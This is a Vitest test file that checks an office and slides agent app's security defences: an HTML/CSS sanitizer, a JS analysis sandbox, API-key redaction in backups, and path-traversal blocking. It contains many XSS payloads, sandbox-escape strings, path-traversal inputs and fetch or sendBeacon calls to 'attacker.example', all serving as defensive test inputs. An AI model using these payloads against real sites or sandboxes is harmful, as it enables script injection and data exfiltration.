import { fireEvent, render } from "@testing-library/react";
import { createElement } from "react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { createOfficeTools } from "../agent/tools/office-tools";
import {
  assertSafeAnalysisCode,
  createSandboxTools,
  createWorkerSandboxSource,
} from "../agent/tools/sandbox-tools";
import { SlidesViewer } from "../components/preview/SlidesViewer";
import {
  buildSlidesHtmlDocument,
  createStarterDemoSlidesHtml,
  parseSlidesHtmlDocument,
  parseSlidesHtmlWithRegex,
  sanitizeSlideCss,
  sanitizeSlideHtml,
  updateSlideInHtmlDocument,
  validateSlidesHtml,
} from "../office";
import { TauriPlatformAdapter } from "../platform/tauri-adapter";
import { clearAllLocalData, exportBackupBundle, kvSet } from "../storage/db";
import { WorkspaceVFS } from "../storage/workspace-vfs";
import type { NewApiConfig } from "../types";

const tauriPluginFsMocks = vi.hoisted(() => ({
  mkdir: vi.fn(async () => undefined),
  writeFile: vi.fn(async () => undefined),
}));

vi.mock("@tauri-apps/plugin-fs", () => ({
  mkdir: tauriPluginFsMocks.mkdir,
  writeFile: tauriPluginFsMocks.writeFile,
}));

describe("安全加固专项测试（幻灯片 XSS、JS 沙箱、备份脱敏、目录穿越防护）", () => {
  let vfs: WorkspaceVFS;

  beforeEach(async () => {
    await clearAllLocalData();
    vfs = new WorkspaceVFS();
    tauriPluginFsMocks.mkdir.mockClear();
    tauriPluginFsMocks.writeFile.mockClear();
    if (typeof globalThis.ResizeObserver === "undefined") {
      globalThis.ResizeObserver = class {
        observe() {}
        unobserve() {}
        disconnect() {}
      };
    }
  });

  afterEach(() => {
    vi.restoreAllMocks();
    document.body.innerHTML = "";
  });

  it("sanitizeSlideHtml 清除 script/iframe/事件属性/危险协议/危险样式及嵌套变体，并保留合法 SVG 与 Bento 结构", () => {
    const xssPayload = [
      '<div class="bento-grid" onclick="alert(1)" style="display: grid; width: expression(alert(1)); background: url(javascript:alert(2));">',
      '  <div class="bento-card span-7" onmouseover=alert(3) style="color: #f7f8f8; behavior: url(xss.htc); -moz-binding: url(xss.xml#x); @import \'https://evil.com/a.css\';">',
      '    <h3 class="slide-h3">营收分析</h3>',
      '    <script>alert("xss1")</script>',
      '    <scr<script>ipt>alert("nested1")</scr</script>ipt>',
      '    <scr<script></script>ipt>alert("nested2")</scr<script></script>ipt>',
      '    <<script>script>alert("nested3")<</script>/script>',
      '    <script src="https://evil.com/a.js">',
      '    </script>',
      '    <!--><script>alert("comment-smuggle")</script>',
      '    <iframe src="https://evil.com" srcdoc="<script>alert(4)</script>"><iframe>nested</iframe></iframe>',
      '    <object data="https://evil.com/a.swf"></object>',
      '    <embed src="https://evil.com/b.swf" />',
      '    <form action="javascript:alert(5)"><button formaction="vbscript:msgbox(1)">点我</button></form>',
      '    <base href="https://evil.com/" />',
      '    <meta http-equiv="refresh" content="0;url=https://evil.com" />',
      '    <link rel="stylesheet" href="https://evil.com/evil.css" />',
      '    <img src="x" onerror=\'alert(6)\' />',
      '    <img/src="https://cdn.example.com/ok.png"/onload=alert(7)>',
      '    <img src="data:text/html,<script>alert(8)</script>" alt="bad" />',
      '    <img src="data:image/png;base64,iVBORw0KGgo=" alt="good-img" />',
      '    <a href="  \t\n JaVaScRiPt:alert(9)" xlink:href="&#x6a;avascript:alert(10)">链接1</a>',
      '    <a href="#slide-2">锚点</a>',
      '    <svg viewBox="0 0 600 280" width="600" height="280" onload="alert(11)">',
      '      <foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(12)</script></body></foreignObject>',
      '      <defs><linearGradient id="g1"><stop offset="0%" stop-color="#5e6ad2" /></linearGradient></defs>',
      '      <rect class="chart-bar-accent" x="78" y="44" width="38" height="200" rx="5" fill="url(#g1)" data-region="华东区" />',
      '      <text x="97" y="36" fill="#f7f8f8">385</text>',
      "    </svg>",
      "  </div>",
      "</div>",
    ].join("\n");

    const clean = sanitizeSlideHtml(xssPayload);

    // 危险标签与嵌套变体应完全被移除
    expect(clean).not.toMatch(/<\s*\/?\s*(script|iframe|object|embed|form|base|meta|link|foreignObject)\b/i);
    expect(clean).not.toContain('alert("xss1")');
    expect(clean).not.toContain('alert("nested2")');
    expect(clean).not.toContain("comment-smuggle");
    // 危险事件属性与 srcdoc 应被移除
    expect(clean).not.toMatch(/\son(?:click|mouseover|error|load)\b/i);
    expect(clean).not.toMatch(/\bsrcdoc\b/i);
    // 危险协议与危险 CSS 应被清除
    expect(clean).not.toMatch(/javascript:/i);
    expect(clean).not.toMatch(/vbscript:/i);
    expect(clean).not.toMatch(/data:text\/html/i);
    expect(clean).not.toMatch(/expression\s*\(/i);
    expect(clean).not.toMatch(/behavior\s*:/i);
    expect(clean).not.toMatch(/-moz-binding/i);
    expect(clean).not.toMatch(/@import/i);

    // 合法 Bento、图表 SVG、安全图片与安全样式应完整保留
    expect(clean).toContain('class="bento-grid"');
    expect(clean).toContain('class="bento-card span-7"');
    expect(clean).toContain("display: grid");
    expect(clean).toContain("color: #f7f8f8");
    expect(clean).toContain('src="https://cdn.example.com/ok.png"');
    expect(clean).toContain('src="data:image/png;base64,iVBORw0KGgo="');
    expect(clean).toContain('href="#slide-2"');
    expect(clean).toContain('<svg viewBox="0 0 600 280" width="600" height="280">');
    expect(clean).toContain("<linearGradient");
    expect(clean).toContain("<rect");
    expect(clean).toContain('data-region="华东区"');
    expect(clean).toContain(">385</text>");
  });

  it("封堵 HTML5 解析差异绕过（嵌套/SVG style 跳出、textarea/title 闭合欺骗、SVG 动画与外部 use、customCss 注入）", () => {
    const parserBypassPayload = [
      '<div class="bento-card">',
      '  <style><style><img src=x onerror=alert("style-nest")></style>',
      '  <svg><style><img src=x onerror=alert("svg-style")></style><rect x="0" y="0" width="10" height="10" /></svg>',
      '  <style><img title="</style><script>alert(\'style-break\')</script>"></style>',
      '  <textarea><img title="</textarea><script>alert(\'ta-break\')</script>"></textarea>',
      '  <title><img title="</title><img src=x onerror=alert(\'title-break\')>"></title>',
      '  <xmp></xmp><svg onload=alert("xmp-break")></xmp>',
      '  <noembed></noembed><noframes></noframes>',
      '  <svg viewBox="0 0 100 100">',
      '    <animate attributeName="href" values="javascript:alert(1)" />',
      '    <set attributeName="onmouseover" to="alert(2)" />',
      '    <animateMotion path="M0,0 L10,10" />',
      '    <animateTransform type="rotate" />',
      '    <use href="https://evil.com/sprite.svg#bad" />',
      '    <use xlink:href="data:image/svg+xml;base64,PHN2Zz4=" />',
      '    <use href="#safe-icon" />',
      '  </svg>',
      '  <plaintext><img src=x onerror=alert("plaintext")>',
      "</div>",
    ].join("\n");

    const clean = sanitizeSlideHtml(parserBypassPayload);
    expect(clean).not.toContain("onerror");
    expect(clean).not.toContain("onload");
    expect(clean).not.toContain("style-nest");
    expect(clean).not.toContain("svg-style");
    expect(clean).not.toContain("style-break");
    expect(clean).not.toContain("ta-break");
    expect(clean).not.toContain("title-break");
    expect(clean).not.toContain("xmp-break");
    expect(clean).not.toContain("plaintext");
    expect(clean).not.toMatch(/<\s*\/?\s*(textarea|title|xmp|noembed|noframes|plaintext|animate|set|animateMotion|animateTransform)\b/i);
    expect(clean).not.toContain("https://evil.com/sprite.svg");
    expect(clean).not.toContain("data:image/svg+xml");
    expect(clean).toContain('<use href="#safe-icon" />');
    expect(clean).toContain('<rect x="0" y="0" width="10" height="10" />');

    // 验证 sanitizeSlideCss 与 customCss 链路清洗
    const dirtyCss = [
      '@import url("https://evil.com/a.css");',
      '@/**/import "https://evil.com/b.css";',
      ".mizurisu-slide-scope .card {",
      "  color: #f7f8f8;",
      "  width: expression(alert(1));",
      "  behavior: url(xss.htc);",
      "  -moz-binding: url(xss.xml#x);",
      '  background: url("javascript:alert(2)");',
      '  content: "</style><script>alert(3)</script>";',
      "}",
    ].join("\n");
    const cleanCss = sanitizeSlideCss(dirtyCss);
    expect(cleanCss).toContain("color: #f7f8f8");
    expect(cleanCss).not.toMatch(/@import/i);
    expect(cleanCss).not.toMatch(/expression\s*\(/i);
    expect(cleanCss).not.toMatch(/behavior\s*:/i);
    expect(cleanCss).not.toMatch(/-moz-binding/i);
    expect(cleanCss).not.toMatch(/javascript:/i);
    expect(cleanCss).not.toContain("<");
    expect(cleanCss).not.toContain(">");

    const docWithDirtyCustomCss = buildSlidesHtmlDocument({
      title: "CustomCss 安全测试",
      theme: "linear-dark",
      customCss: dirtyCss,
      slides: [{ title: "首页", html: '<div class="card">Hello</div>' }],
    });
    expect(docWithDirtyCustomCss).not.toContain("@import");
    expect(docWithDirtyCustomCss).not.toContain("expression(");
    const parsedDoc = parseSlidesHtmlDocument(docWithDirtyCustomCss);
    expect(parsedDoc.customCss).toContain("color: #f7f8f8");
    expect(parsedDoc.customCss).not.toContain("expression(");
    expect(parsedDoc.customCss).not.toContain("@import");
  });

  it("幻灯片解析/构建/更新链路与 SlidesViewer 均强制执行 sanitizeSlideHtml", () => {
    const dirtySlide =
      '<div class="cover-stage" onclick="alert(1)"><h1 class="slide-h1">安全测试</h1><script>alert(2)</script><img src="javascript:alert(3)" /></div>';

    const doc = buildSlidesHtmlDocument({
      title: "XSS 拦截演示",
      theme: "linear-dark",
      slides: [{ title: "首页", html: dirtySlide }],
    });

    const parsedDom = parseSlidesHtmlDocument(doc);
    const parsedRegex = parseSlidesHtmlWithRegex(doc);
    for (const parsed of [parsedDom, parsedRegex]) {
      expect(parsed.slides[0].html).not.toContain("<script");
      expect(parsed.slides[0].html).not.toContain("onclick");
      expect(parsed.slides[0].html).not.toContain("javascript:");
      expect(parsed.slides[0].html).toContain("安全测试");
    }

    const updatedDoc = updateSlideInHtmlDocument(doc, 1, {
      html: '<p class="slide-lead" style="width: expression(alert(9)); color: #fff;">正文<iframe src="https://evil.com"></iframe></p>',
    });
    const parsedUpdated = parseSlidesHtmlDocument(updatedDoc);
    expect(parsedUpdated.slides[0].html).not.toContain("<iframe");
    expect(parsedUpdated.slides[0].html).not.toContain("expression(");
    expect(parsedUpdated.slides[0].html).toContain("color: #fff");

    // 渲染 SlidesViewer 确认主舞台、缩略图与全屏模式 DOM 中均无任何危险脚本或事件属性
    const bytes = new TextEncoder().encode(updatedDoc);
    const { container, getByLabelText } = render(
      createElement(SlidesViewer, { path: "safe.slides.html", bytes })
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.innerHTML).not.toContain("expression(");

    // 切换到全屏模式也应安全渲染
    fireEvent.click(getByLabelText("全屏放映"));
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.innerHTML).not.toContain("expression(");

    // 确认现有 starter demo 幻灯片在清洗后仍保持 0 违规通过体检
    const starter = createStarterDemoSlidesHtml();
    const report = validateSlidesHtml(starter);
    expect(report.ok).toBe(true);
    expect(report.issues).toEqual([]);
  });

  it("run_js_analysis 阻断 fetch/XMLHttpRequest/WebSocket/sendBeacon 等外泄接口并支持 dataPaths 多表联合分析", async () => {
    const officeTools = createOfficeTools(vfs);
    const sandboxTools = createSandboxTools(vfs);
    const excelCreate = officeTools.find((t) => t.name === "excel_create")!;
    const jsTool = sandboxTools.find((t) => t.name === "run_js_analysis")!;

    await excelCreate.execute("e_1", {
      path: "orders.xlsx",
      sheets: [
        {
          name: "订单",
          headers: ["单号", "金额"],
          rows: [
            ["ORD-01", 1000],
            ["ORD-02", 2500],
          ],
        },
      ],
    });
    await vfs.writeText(
      "payments.json",
      JSON.stringify([
        { orderId: "ORD-01", paid: 1000 },
        { orderId: "ORD-02", paid: 2000 },
      ])
    );

    // 1. 验证网络外泄接口全部被沙箱拦截
    await expect(
      jsTool.execute("s_fetch", {
        code: 'return fetch("https://attacker.example/leak");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_global_fetch", {
        code: 'return globalThis.fetch("https://attacker.example/leak");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_xhr", {
        code: "const x = new XMLHttpRequest(); return x;",
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_ws", {
        code: 'return new WebSocket("wss://attacker.example/ws");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_es", {
        code: 'return new EventSource("https://attacker.example/es");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_import", {
        code: 'return importScripts("https://attacker.example/payload.js");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_beacon", {
        code: 'return navigator.sendBeacon("https://attacker.example/beacon", "secret");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    // 1.5 验证绕过姿态（含行注释隔断 import // ...\n ()、Function/eval/.constructor 逃逸、多层原型链与新通信 API）均被拦截
    expect(() => assertSafeAnalysisCode('return import("https://evil.com/x.js");')).toThrow(
      /禁止动态导入或逃逸构造/
    );
    expect(() =>
      assertSafeAnalysisCode('return import // 行注释分隔绕过\n ("https://evil.com/x.js");')
    ).toThrow(/禁止动态导入或逃逸构造/);
    expect(() =>
      assertSafeAnalysisCode('return import /* 块注释 */ // 行注释\n .meta.url;')
    ).toThrow(/禁止动态导入或逃逸构造/);
    expect(() => assertSafeAnalysisCode('return Function("return this")();')).toThrow(
      /禁止动态导入或逃逸构造/
    );
    expect(() =>
      assertSafeAnalysisCode('return ({}).constructor.constructor("return fetch")();')
    ).toThrow(/禁止动态导入或逃逸构造/);
    expect(() => assertSafeAnalysisCode('return (0, eval)("1+1");')).toThrow(
      /禁止动态导入或逃逸构造/
    );
    // 正常 function 声明、数组与对象访问以及含 // 的 URL 字符串应放行
    expect(() =>
      assertSafeAnalysisCode(
        'function add(a, b) { return a + b; } const label = "https://example.com/ok"; return Object.keys({ a: 1 }).map(k => add(1, k.length));'
      )
    ).not.toThrow();

    await expect(
      jsTool.execute("s_dynamic_import", {
        code: 'return import("https://attacker.example/evil.js");',
      })
    ).rejects.toThrow(/禁止动态导入或逃逸构造/);

    await expect(
      jsTool.execute("s_dynamic_import_line_comment", {
        code: 'return import // bypass\n ("https://attacker.example/evil.js");',
      })
    ).rejects.toThrow(/禁止动态导入或逃逸构造/);

    await expect(
      jsTool.execute("s_func_ctor", {
        code: 'return Function("return this")();',
      })
    ).rejects.toThrow(/禁止动态导入或逃逸构造/);

    await expect(
      jsTool.execute("s_eval_indirect", {
        code: 'return (0, eval)("fetch");',
      })
    ).rejects.toThrow(/禁止动态导入或逃逸构造/);

    await expect(
      jsTool.execute("s_global_bracket_fn", {
        code: 'return globalThis["Func" + "tion"]("return 1")();',
      })
    ).rejects.toThrow(/禁止动态导入或逃逸构造/);

    await expect(
      jsTool.execute("s_top_fetch", {
        code: 'return top.fetch("https://attacker.example/leak");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_webtransport", {
        code: 'return new WebTransport("https://attacker.example/wt");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_worker", {
        code: 'return new Worker("https://attacker.example/w.js");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    // 1.6 验证 Blob Worker 引导脚本沿着完整原型链（2 层以上如 WorkerGlobalScope.prototype）全部锁定
    const posted: Array<{ ok: boolean; result?: unknown; error?: string }> = [];
    const workerGlobalScopeProto = {
      fetch: () => "native-fetch-leaked",
      importScripts: () => "native-importScripts-leaked",
      WebTransport: function MockWT() {},
    };
    const dedicatedWorkerProto = Object.create(workerGlobalScopeProto) as Record<string, unknown>;
    const navigatorProto = {
      sendBeacon: () => true,
    };
    const mockNavigator = Object.create(navigatorProto) as Record<string, unknown>;
    const mockSelf = Object.create(dedicatedWorkerProto) as Record<string, unknown> & {
      postMessage: (msg: { ok: boolean; result?: unknown; error?: string }) => void;
      onmessage?: (ev: { data: { code: string; data?: unknown; datasets?: unknown } }) => void;
      navigator: Record<string, unknown>;
    };
    mockSelf.navigator = mockNavigator;
    mockSelf.postMessage = (msg) => {
      posted.push(msg);
    };

    const bootWorker = new Function("self", createWorkerSandboxSource());
    bootWorker(mockSelf);

    mockSelf.onmessage?.({
      data: {
        code: 'return Object.getPrototypeOf(Object.getPrototypeOf(self))["fe" + "tch"]("https://evil.com");',
      },
    });
    mockSelf.onmessage?.({
      data: {
        code: 'return Object.getPrototypeOf(self.navigator)["send" + "Beacon"]("https://evil.com", "x");',
      },
    });
    mockSelf.onmessage?.({
      data: {
        code: "return [1, 2, 3].map(x => x * 2);",
      },
    });

    expect(posted[0].ok).toBe(false);
    expect(posted[0].error).toMatch(/禁止网络请求/);
    expect(posted[1].ok).toBe(false);
    expect(posted[1].error).toMatch(/禁止网络请求/);
    expect(posted[2]).toEqual({ ok: true, result: [2, 4, 6] });

    // 验证降级分支不误伤合法数组与对象访问
    const safeObjRes = await jsTool.execute("s_safe_array_obj", {
      code: "const arr = [{ k: 'a', v: 10 }, { k: 'b', v: 20 }]; return Object.fromEntries(arr.map(x => [x.k, x.v * 2]));",
    });
    expect(JSON.parse((safeObjRes.content[0] as { text: string }).text)).toEqual({
      a: 20,
      b: 40,
    });

    // 2. 验证 dataPaths 多表联合对账与 dataPath 向下兼容
    const multiRes = await jsTool.execute("s_multi", {
      dataPath: "orders.xlsx",
      dataPaths: ["orders.xlsx", "payments.json"],
      code: `
        const orders = datasets["orders.xlsx"].records;
        const payments = datasets["payments.json"];
        const paidMap = new Map(payments.map(p => [p.orderId, p.paid]));
        const diffs = orders.map(o => ({
          id: o["单号"],
          diff: Number(o["金额"]) - Number(paidMap.get(o["单号"]) || 0)
        }));
        return { singleCount: data.records.length, diffs };
      `,
    });
    const parsed = JSON.parse((multiRes.content[0] as { text: string }).text);
    expect(parsed.singleCount).toBe(2);
    expect(parsed.diffs).toEqual([
      { id: "ORD-01", diff: 0 },
      { id: "ORD-02", diff: 500 },
    ]);
  });

  it("exportBackupBundle 默认脱敏 apiKey 且标记 secretsRedacted: true，传 includeSecrets: true 时保留原密钥", async () => {
    const config: NewApiConfig = {
      brandName: "Mizurisu Agent",
      baseUrl: "https://relay.example.com",
      apiKey: "sk-super-secret-token-123456",
      protocolMode: "compatible",
      selectedModelId: "gpt-4o",
      thinkingLevel: "off",
      customModels: [],
      modelProtocolOverrides: {},
    };
    await kvSet("newapi_config", config);

    const redacted = await exportBackupBundle();
    expect(redacted.secretsRedacted).toBe(true);
    expect(redacted.config?.apiKey).toBe("");
    expect(redacted.config?.baseUrl).toBe("https://relay.example.com");

    const full = await exportBackupBundle({ includeSecrets: true });
    expect(full.secretsRedacted).toBe(false);
    expect(full.config?.apiKey).toBe("sk-super-secret-token-123456");
  });

  it("TauriPlatformAdapter.writeToNativeDirectory 严格阻断路径穿越、绝对路径、盘符与空路径段", async () => {
    const adapter = new TauriPlatformAdapter();
    const bytes = new Uint8Array([1, 2, 3]);

    const badPaths = [
      "",
      "/etc/passwd",
      "//server/share/evil.txt",
      "\\\\server\\share\\evil.txt",
      "C:\\Windows\\System32\\evil.dll",
      "d:/secret.txt",
      "C:relative_drive.txt",
      "../escape.txt",
      "reports/../../escape.txt",
      "reports\\..\\..\\escape.txt",
      "reports//empty.txt",
      "reports/",
      "./dot.txt",
      "bad\0file.txt",
      "CON",
      "nul.txt",
      "COM1.xlsx",
      "LPT9",
      "trailing_space.txt ",
      "trailing_dot.txt.",
      "sub /file.txt",
    ];

    for (const bad of badPaths) {
      await expect(
        adapter.writeToNativeDirectory("D:\\workspace", bad, bytes)
      ).rejects.toThrow();
    }
    expect(tauriPluginFsMocks.writeFile).not.toHaveBeenCalled();

    // 合法相对路径（含嵌套目录与文件名中的 .. 非穿越字符）应正常放行
    await adapter.writeToNativeDirectory(
      "D:\\workspace\\",
      "reports\\2026\\q2..summary.xlsx",
      bytes
    );
    expect(tauriPluginFsMocks.mkdir).toHaveBeenCalledWith("D:\\workspace/reports/2026", {
      recursive: true,
    });
    expect(tauriPluginFsMocks.writeFile).toHaveBeenCalledWith(
      "D:\\workspace/reports/2026/q2..summary.xlsx",
      bytes
    );
  });
});
